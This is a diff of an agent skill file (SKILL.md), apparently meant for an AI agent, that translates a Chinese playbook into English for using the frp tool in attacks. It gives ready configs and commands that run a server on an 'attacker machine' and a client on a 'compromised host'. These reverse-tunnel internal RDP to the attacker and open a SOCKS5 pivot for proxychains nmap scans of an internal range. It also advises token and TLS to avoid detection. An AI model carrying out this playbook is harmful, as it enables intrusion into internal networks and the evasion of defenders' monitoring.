@@ -2,45 +2,48 @@
 name: frp-tunnel
 description: "frp tunnels client SOCKS5 traffic across internal segments. Signals: internal tunneling, tunnel, start server on attacker, start client on compromised host, enable TLS, prevent plaintext traffic."
 zh-signals: "frp: 客户端起 SOCKS5 打穿整个内网段。信号:内网穿透,隧道,启动服务端(攻击机),启动客户端(已控内网机),开启 TLS,防流量明文。"
+when-to-use: >-
+  Use when you control a host inside an internal network and need a reverse tunnel
+  or SOCKS5 proxy to reach internal services from the attacker machine, optionally with TLS.
 ---
 
 # frp
 
-- 攻击大类:C32 隧道与内网穿透
-- 上游仓库:https://github.com/fatedier/frp
-- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C32 Tunneling and Internal Network Pivoting
+- Upstream Repository: https://github.com/fatedier/frp
+- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-# 从 Releases 下载对应平台二进制:https://github.com/fatedier/frp/releases
-# 服务端 frps / 客户端 frpc,免安装
+# Download the binary for your platform from Releases: https://github.com/fatedier/frp/releases
+# Server frps / client frpc, no installation needed
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 配置 | 说明 |
+| Parameter / Config | Description |
 | --- | --- |
-| `frps -c frps.toml` | 启动服务端(攻击机) |
-| `frpc -c frpc.toml` | 启动客户端(已控内网机) |
-| `[common] serverAddr / serverPort / token` | 客户端指向服务端,token 鉴权 |
-| `[[proxies]] type="tcp" remotePort=6000` | 把内网 22 端口映到攻击机 6000 |
-| `type="stcp"` / `type="xtcp"` | 点对点/加密隧道,不经服务端中转流量 |
-| `type="tcp" plugin="socks5"` | 客户端直接起 SOCKS5 代理穿透内网 |
-| `transport.tls.enable=true` | 开启 TLS,防流量明文 |
+| `frps -c frps.toml` | Start the server (attacker machine) |
+| `frpc -c frpc.toml` | Start the client (compromised internal host) |
+| `[common] serverAddr / serverPort / token` | Client points at the server, token authentication |
+| `[[proxies]] type="tcp" remotePort=6000` | Map internal port 22 to attacker machine port 6000 |
+| `type="stcp"` / `type="xtcp"` | Peer-to-peer / encrypted tunnel, traffic is not relayed through the server |
+| `type="tcp" plugin="socks5"` | Client starts a SOCKS5 proxy directly to pivot into the internal network |
+| `transport.tls.enable=true` | Enable TLS to prevent plaintext traffic |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 基础反向隧道(内网 3389 → 攻击机 6000)
+### Basic reverse tunnel (internal 3389 → attacker machine 6000)
 
-攻击机 frps.toml:
+frps.toml on the attacker machine:
 ```toml
 bindPort = 7000
 auth.token = "strong-token-here"
 ```
-已控机 frpc.toml:
+frpc.toml on the compromised host:
 ```toml
-serverAddr = "攻击机IP"
+serverAddr = "attacker-IP"
 serverPort = 7000
 auth.token = "strong-token-here"
 [[proxies]]
@@ -51,12 +54,12 @@ localPort = 3389
 remotePort = 6000
 ```
 ```bash
-frps -c frps.toml            # 攻击机
-frpc -c frpc.toml            # 已控机
-rdesktop 攻击机IP:6000       # 从攻击机直连内网 RDP
+frps -c frps.toml            # attacker machine
+frpc -c frpc.toml            # compromised host
+rdesktop attacker-IP:6000       # connect straight from the attacker machine to the internal RDP
 ```
 
-### 客户端起 SOCKS5 打穿整个内网段
+### Client-side SOCKS5 to pivot across the whole internal segment
 
 ```toml
 [[proxies]]
@@ -69,6 +72,6 @@ plugin = "socks5"
 proxychains nmap -sT -p 1-1000 10.0.0.0/24
 ```
 
-## 注意事项
+## Notes
 
-隧道配 token + TLS 防被第三方接管或识别;多目标场景给每个已控机配独立 remotePort;大流量走 stcp 模式减轻服务端带宽。
+Configure token + TLS on the tunnel to prevent third-party takeover or detection; in multi-target scenarios give each compromised host its own remotePort; use stcp mode for heavy traffic to reduce server bandwidth.
